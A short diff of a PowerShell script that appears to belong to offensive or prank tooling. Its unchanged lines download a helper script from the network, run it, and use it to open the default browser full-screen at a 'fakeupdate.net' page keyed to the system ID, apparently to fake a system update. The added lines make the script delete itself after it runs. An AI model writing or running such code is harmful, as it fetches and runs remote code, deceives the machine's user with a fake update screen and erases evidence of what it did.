@@ -111,4 +111,6 @@ iwr -uri "$SendKeyscmdlet" -OutFile "sendkeys.ps1"
 .\sendkeys.ps1 -Program "$DefaultBrowserPath" -SendKey "https://fakeupdate.net/$SystemId/~{F11}"
 
 #CleanUp
-Remove-Item sendkeys.ps1 -Force
+Remove-Item -Path "sendkeys.ps1" -Force
+#Auto Delete this cmdlet in the end ...
+Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force
